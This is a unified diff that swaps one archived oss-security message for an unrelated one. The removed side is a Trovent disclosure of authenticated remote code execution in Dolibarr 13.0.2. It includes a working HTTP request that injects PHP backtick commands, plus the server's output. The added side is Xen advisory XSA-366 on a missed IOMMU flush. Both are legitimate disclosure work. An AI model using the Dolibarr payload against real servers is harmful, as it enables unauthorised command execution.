@@ -1,158 +1,109 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/11/10/2
-Message-ID: <A8hHfMk2fHN6wpAjOxqa33utuQ8_U_miKty_tYxSX0aucRF-238gdc8_z60udBllsgJsAPVb1X6fgZbSSklHa_WHGrwoQ9gzGSmzEEza0Zk=@trovent.io>
-Date: Wed, 10 Nov 2021 11:40:41 +0000
-From: Stefan Pietsch <s.pietsch@...vent.io>
-To: Packet Storm <submissions@...ketstormsecurity.com>, Full Disclosure <fulldisclosure@...lists.org>, oss-security <oss-security@...ts.openwall.com>
-Subject: Trovent Security Advisory 2106-01 / CVE-2021-33816: Authenticated remote code execution in Dolibarr ERP & CRM
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/23/1
+Message-Id: <E1lEagN-0005TY-Eq@xenbits.xenproject.org>
+Date: Tue, 23 Feb 2021 16:37:07 +0000
+From: Xen.org security team <security@....org>
+To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
+CC: Xen.org security team <security-team-members@....org>
+Subject: Xen Security Advisory 366 v2 (CVE-2021-27379) - missed flush in XSA-321 backport
 Content-Type: text/plain; charset=utf-8
 
-# Trovent Security Advisory 2106-01 #
-#####################################
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
+            Xen Security Advisory CVE-2021-27379 / XSA-366
+                              version 2
 
-Authenticated remote code execution in Dolibarr ERP & CRM
-#########################################################
+                   missed flush in XSA-321 backport
 
+UPDATES IN VERSION 2
+====================
 
-Overview
-########
+CVE assigned.
 
-Advisory ID: TRSA-2106-01
-Advisory version: 1.0
-Advisory status: Public
-Advisory URL: https://trovent.io/security-advisory-2106-01
-Affected product: Dolibarr ERP & CRM
-Tested versions: Dolibarr 13.0.2
-Vendor: Dolibarr foundation, https://www.dolibarr.org
-Credits: Trovent Security GmbH, Nick Decker
+Fixed erroneous reference to XSA-320; should have read XSA-321.
 
+ISSUE DESCRIPTION
+=================
 
-Detailed description
-####################
+An oversight was made when backporting XSA-321, leading entries in the
+IOMMU not being properly updated under certain circumstances.
 
-During our security research Trovent Security discovered
-that the Dolibarr application on default settings allows remote code execution
-in the website builder module. When trying to use statements like "exec()",
-"system()" or "shell_exec()" the application blocks them correctly.
-But we were able to execute code using "``" (backticks) which is the same as
-"shell_exec()" or "echo fread(popen('/bin/ls /', 'r'), 4096);".
+IMPACT
+======
 
-Severity: Critical
-CVSS Score: 9.1 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)
-CWE ID: CWE-94
-CVE ID: CVE-2021-33816
+A malicious guest may be able to retain read/write DMA access to
+frames returned to Xen's free pool, and later reused for another
+purpose.  Host crashes (leading to a Denial of Service) and privilege
+escalation cannot be ruled out.
 
+VULNERABLE SYSTEMS
+==================
 
-Proof of concept
-################
+Xen versions up to 4.11, from at least 3.2 onwards, are affected.  Xen
+versions 4.12 and newer are not affected.
 
-This is the HTTP request that creates a website with the malicious code:
+Only x86 Intel systems are affected.  x86 AMD as well as Arm systems are
+not affected.
 
-REQUEST:
+Only x86 HVM guests using hardware assisted paging (HAP), having a
+passed through PCI device assigned, and having page table sharing
+enabled can leverage the vulnerability.  Note that page table
+sharing will be enabled (by default) only if Xen considers IOMMU and
+CPU large page size support compatible.
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+MITIGATION
+==========
 
+Suppressing the use of page table sharing will avoid the vulnerability
+(command line option "iommu=no-sharept").
 
-POST /website/index.php HTTP/1.1
-Host: 10.11.9.80
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=---------------------------243035796342141148842632336365
-Content-Length: 937
-Origin: http://10.11.9.80
-Connection: close
-Referer: http://10.11.9.80/website/index.php
-Cookie: DOLSESSID_736206a821984837877b8a6a901910d2=v459clrdeu91pfc20se8s0rg4d; DOLUSERCOOKIE_boxfilter_task=all-securitytest-for-dolibarr
-Upgrade-Insecure-Requests: 1
+Suppressing the use of large HAP pages will avoid the vulnerability
+(command line options "hap_2mb=no hap_1gb=no").
 
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name="token"
+Not passing through PCI devices to HVM guests will avoid the
+vulnerability.
 
-f8c257168a5ae06fd1aee2ba4c45ebf9
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name="backtopage"
+CREDITS
+=======
 
+This issue was reported as a bug by M. Vefa Bicakci, and recognized as
+a security issue by Roger Pau Monne of Citrix.
 
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name="action"
+RESOLUTION
+==========
 
-updatesource
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name="website"
+Applying the appropriate attached patch resolves this issue.
 
-test
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name="pageid"
+Note that patches for released versions are generally prepared to
+apply to the stable branches, and may not apply cleanly to the most
+recent release tarball.  Downstreams are encouraged to update to the
+tip of the stable branch before applying these patches.
 
-1
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name="update"
+xsa366-4.11.patch      Xen 4.11.x
 
-Save
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name="PAGE_CONTENT"
+$ sha256sum xsa366*
+3131c9487b9446655e2e21df4ccf1e003bec471881396d7b2b1a0939f5cbae96  xsa366.meta
+8c8c18ca8425e6167535c3cf774ffeb9dcb4572e81c8d2ff4a73fefede2d4d94  xsa366-4.11.patch
+$
 
-<?php
-echo `uname -a`;
-?>
-- -----------------------------243035796342141148842632336365--
+NOTE REGARDING LACK OF EMBARGO
+==============================
 
+This was reported and debugged publicly, before the security
+implications were apparent.
+-----BEGIN PGP SIGNATURE-----
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+iQE/BAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAmA1Lx4MHHBncEB4ZW4u
+b3JnAAoJEIP+FMlX6CvZXRkH+MsCFrh/HOCaqzbdlT46sZBSS3B7wMjaCt4WtB8z
+MKxRY013/MMi7xbOhMvLE/qEtT8cdkOykxac9WjMnAPk2NQE3L3uRvoWsS8cYLa6
+39RklCw0o/0YTsiY4bB5X1jI+8dBZxt4QPYl1YQqsLOHTlSJFix2Vm6w/K8+BZt9
+ceS58GEoAawwlkVXdSH2115rSVRoBUZqgHCkPIc6eOjAmXCPL++8uUToWWhiROWD
+Ic0STLsf/Rt44G71rPh8GoFdncIBULcPlp1LbxCUEzRVhdmeb1/shs79vsIk0Z3l
+c2oHzypyS15p/kdQbulGTXDFq933C4ELtjrY/HwPumJSdg==
+=er6n
+-----END PGP SIGNATURE-----
 
+Download attachment "xsa366.meta" of type "application/octet-stream" (338 bytes)
 
-
-
-CODE:
-
-The website now displays the output of the command:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-[...]
-<div id="websitecontentundertopmenu" class="websitecontentundertopmenu boostrap-iso">
-<!-- style of website from file -->
-<style scoped="">
-/* Include website CSS file */
-/* CSS content (all pages) */
-body.bodywebsite { margin: 0; font-family: 'Open Sans', sans-serif; }
-.bodywebsite h1 { margin-top: 0; margin-bottom: 0; padding: 10px;}/* Include style from the HTML header of page */
-
-</style>
-<div id="divbodywebsite" class="bodywebsite bodywebpage-tsets">
-
-Linux ec9465c86e5e 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
-
-</div></div>
-[...]
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-Solution / Workaround
-#####################
-
-We recommend to disable the 'websites' module in Dolibarr until a fixed version
-is deployed.
-
-Fixed in Dolibarr version 14.0.0, verified by Trovent.
-
-
-History
-#######
-
-2021-06-01: Vulnerability found
-2021-06-02: CVE ID requested
-2021-06-03: CVE ID received
-2021-06-09: Vendor contacted
-2021-06-10: Vendor reported the vulnerability as fixed
-2021-11-08: Add information about fixed version
-2021-11-10: Advisory published
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (856 bytes)
+Download attachment "xsa366-4.11.patch" of type "application/octet-stream" (1512 bytes)
